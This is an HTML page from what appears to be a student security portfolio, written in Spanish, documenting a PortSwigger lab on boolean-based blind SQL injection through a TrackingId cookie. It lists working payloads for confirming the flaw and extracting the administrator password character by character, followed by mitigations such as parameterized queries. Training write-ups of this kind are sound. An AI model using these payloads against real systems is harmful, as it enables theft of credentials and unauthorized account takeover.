@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 11</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>Lab 11</h1>
+        <nav>
+            <ul>
+                <li><a href="pd03.html">← Volver al roadmap</a></li>
+                <li><a href="#lab">Laboratorio</a></li>
+                <li><a href="#procedimiento">Procedimiento</a></li>
+                <li><a href="#evidencia">Evidencia</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- LABORATORIO 11 -->
+    <section id="lab">
+        <h2>Lab11: Blind SQL injection with conditional responses</h2>
+        
+        <table>
+            <tr>
+                <th>Nivel</th>
+                <td>Practitioner</td>
+            </tr>
+            <tr>
+                <th>Tipo de SQLi</th>
+                <td>Blind SQL Injection (Boolean-based)</td>
+            </tr>
+        </table>
+
+        <h3>Objetivo</h3>
+        <p>Comprender cómo un atacante puede extraer información de la base de datos cuando la aplicación no muestra directamente los resultados de las consultas SQL, utilizando respuestas condicionales del servidor.</p>
+
+        <h3>Vulnerabilidad</h3>
+        <p>La aplicación utiliza una cookie llamada <strong>TrackingId</strong> que se incluye directamente dentro de una consulta SQL sin validación.</p>
+        
+        <p>Aunque la aplicación no devuelve errores ni resultados de la consulta en la respuesta HTTP, sí presenta cambios en el contenido de la página dependiendo de si una condición SQL es verdadera o falsa. En este caso, la página muestra el mensaje <strong>"Welcome back"</strong> cuando la condición es verdadera.</p>
+        
+        <p>Esto permite realizar una inyección SQL ciega basada en booleanos, donde el atacante envía consultas que generan condiciones verdaderas o falsas y analiza la respuesta de la aplicación para inferir información.</p>
+        
+        <p><strong>Nota:</strong> En este laboratorio no es necesario utilizar funciones avanzadas como Burp Collaborator. El ataque se basa en observar cambios en la respuesta de la aplicación cuando una condición SQL es verdadera o falsa.</p>
+    </section>
+
+    <!-- PROCEDIMIENTO -->
+    <section id="procedimiento">
+        <h2>Procedimiento</h2>
+        
+        <ol>
+            <li>
+                <strong>Acceder al laboratorio</strong> y abrir Burp Suite, activando la opción Intercept en la pestaña Proxy para capturar las peticiones HTTP enviadas por el navegador.
+            </li>
+            <li>
+                <strong>Interactuar con la página</strong> (por ejemplo seleccionando una categoría de productos) para interceptar una petición. En la solicitud interceptada se puede observar una cookie llamada <strong>TrackingId</strong>, la cual será el punto de inyección.
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px; margin-top: 10px;">GET /filter?category=Gifts HTTP/1.1
+Cookie: TrackingId=xyz123</pre>
+            </li>
+            <li>
+                <strong>Enviar la petición interceptada al Repeater</strong> para poder modificarla manualmente y probar diferentes payloads de SQL Injection.
+            </li>
+            <li>
+                <strong>Probar una condición booleana verdadera</strong> modificando el valor de la cookie TrackingId con un payload como:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">TrackingId=xyz' AND '1'='1</pre>
+                <p>Observar que la página muestra el mensaje <strong>"Welcome back"</strong>, indicando que la condición es verdadera.</p>
+            </li>
+            <li>
+                <strong>Probar una condición falsa</strong> modificando el payload a:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">TrackingId=xyz' AND '1'='2</pre>
+                <p>En este caso el mensaje <strong>"Welcome back"</strong> desaparece, lo que confirma que la consulta SQL está siendo evaluada por la base de datos y que la respuesta condicional funciona.</p>
+            </li>
+            <li>
+                <strong>Verificar la existencia del usuario administrator</strong> mediante una subconsulta SQL:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</pre>
+                <p>Si aparece "Welcome back", significa que el usuario administrator existe en la tabla users.</p>
+            </li>
+            <li>
+                <strong>Determinar la longitud de la contraseña</strong> del usuario administrator:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</pre>
+                <p>Se incrementa el número (LENGTH(password)>2, >3, etc.) hasta que "Welcome back" desaparezca. Cuando desaparece, la longitud es el último número que mostró el mensaje.</p>
+            </li>
+            <li>
+                <strong>Extraer la contraseña carácter por carácter</strong> utilizando la función SUBSTRING:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</pre>
+                <p>Se prueba cada carácter (a-z, 0-9) hasta que "Welcome back" aparece, indicando que el carácter es correcto. Luego se pasa a la siguiente posición (SUBSTRING(password,2,1), etc.).</p>
+            </li>
+            <li>
+                <strong>Automatizar el proceso</strong> con Burp Intruder para probar todas las posiciones y caracteres de forma eficiente.
+            </li>
+        </ol>
+
+        <h3>Payloads utilizados</h3>
+        
+        <h4>Payload de confirmación (verdadero)</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' AND '1'='1</pre>
+        
+        <h4>Payload de confirmación (falso)</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' AND '1'='2</pre>
+        
+        <h4>Payload para verificar existencia de administrator</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</pre>
+        
+        <h4>Payload para determinar longitud de contraseña</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a</pre>
+        
+        <h4>Payload para extraer caracteres</h4>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px; font-size: 1.1rem;">xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</pre>
+        
+        <h4>Explicación de los payloads</h4>
+        <ul>
+            <li><strong>xyz'</strong>: Cierra la cadena original de la cookie TrackingId.</li>
+            <li><strong>AND</strong>: Permite agregar una condición adicional a la consulta SQL.</li>
+            <li><strong>'1'='1</strong>: Condición booleana que siempre es verdadera. Útil para verificar el comportamiento base.</li>
+            <li><strong>'1'='2</strong>: Condición que siempre es falsa. Útil para confirmar que la respuesta cambia.</li>
+            <li><strong>(SELECT 'a' FROM users WHERE username='administrator')='a'</strong>: Subconsulta que devuelve 'a' si existe el usuario administrator. La condición completa es verdadera solo si el usuario existe.</li>
+            <li><strong>LENGTH(password)=20</strong>: Verifica si la longitud de la contraseña es 20.</li>
+            <li><strong>SUBSTRING(password,1,1)='a'</strong>: Extrae el primer carácter de la contraseña y lo compara con 'a'.</li>
+        </ul>
+        
+        <h4>Proceso de extracción manual</h4>
+        <ul>
+            <li><strong>Paso 1:</strong> Confirmar vulnerabilidad con '1'='1' vs '1'='2'.</li>
+            <li><strong>Paso 2:</strong> Confirmar existencia del usuario administrator.</li>
+            <li><strong>Paso 3:</strong> Determinar longitud de contraseña (ej. 20 caracteres).</li>
+            <li><strong>Paso 4:</strong> Para cada posición i de 1 a 20, probar caracteres 'a'...'z', '0'...'9' hasta encontrar el que muestra "Welcome back".</li>
+        </ul>
+    </section>
+
+    <!-- EVIDENCIA TÉCNICA -->
+    <section id="evidencia">
+   
+
+        <h3>Verificación del ataque</h3>
+        <p>La vulnerabilidad se confirma al observar cambios en la respuesta de la aplicación cuando aparece o desaparece el mensaje <strong>"Welcome back"</strong> dependiendo de la condición SQL inyectada.</p>
+        
+        <p>Una vez extraída la contraseña completa del usuario administrator (por ejemplo, "8fg5h2j1k4m9p3q7r2s5"), se utiliza en el formulario de login para acceder como administrador, demostrando que:</p>
+        <ul>
+            <li>La inyección SQL ciega es posible incluso sin ver datos directamente.</li>
+            <li>Se puede extraer información sensible mediante inferencia booleana.</li>
+            <li>El impacto es equivalente al de una inyección SQL tradicional.</li>
+        </ul>
+        
+        <div style="background-color: #1e293b; padding: 15px; border-radius: 8px; margin-top: 20px;">
+            <p><strong>Resultado esperado:</strong> El laboratorio se resuelve correctamente al iniciar sesión como administrator y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.</p>
+        </div>
+    </section>
+
+    <!-- MITIGACIÓN RECOMENDADA -->
+    <section>
+        <h2>Mitigación recomendada</h2>
+        
+        <h4>Consultas Preparadas (Parameterized Queries)</h4>
+        <p>Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los valores inyectados se tratan como datos y no como parte de la estructura SQL, bloqueando cualquier intento de inyección, incluso los basados en respuestas condicionales.</p>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">SELECT * FROM tracking WHERE id = ?</pre>
+        
+        <h4>Validación de Entradas</h4>
+        <p>Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible (alfanumérico de longitud fija), rechazar cualquier valor que no cumpla con ese patrón.</p>
+        
+        <h4>Eliminar Respuestas Condicionales</h4>
+        <p>Modificar la aplicación para que no muestre contenido diferente basado en resultados de consultas a la base de datos. El mensaje "Welcome back" debería mostrarse de forma consistente o no mostrarse en absoluto, independientemente del TrackingId.</p>
+        
+        <h4>Web Application Firewall (WAF)</h4>
+        <p>Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de manipulación de cookies.</p>
+        
+        <h4>Principio de Menor Privilegio</h4>
+        <p>La cuenta de base de datos utilizada por la aplicación debe tener permisos mínimos, limitando el acceso a las tablas necesarias.</p>
+        
+        <h4>Evitar que Parámetros del Cliente se Concateten en Consultas SQL</h4>
+        <p>Ningún dato proveniente del cliente (cookies, headers, parámetros) debe concatenarse directamente en consultas SQL.</p>
+    </section>
+
+    <!-- REFERENCIA AL DOCUMENTO ORIGINAL -->
+    <section style="background-color: #0f172a; border: 1px solid #334155;">
+       
+        <p><a href="act08-Equipo1.pdf" class="btn-blog" style="margin-top: 10px; display: inline-block;" download>Descargar PDF completo</a></p>
+    </section>
+
+    <!-- NAVEGACIÓN ENTRE LABORATORIOS -->
+    <section style="display: flex; justify-content: space-between; margin-top: 30px;">
+        <a href="pd03-lab10.html" class="btn-blog">← Laboratorio anterior (Lab 10)</a>
+        <a href="pd03-lab12.html" class="btn-blog">Siguiente laboratorio (Lab 12) →</a>
+    </section>
+
+   <footer>
+        <p>  Slugish – Portafolio de Seguridad Informática</p>
+    </footer>
+</body>
+</html>
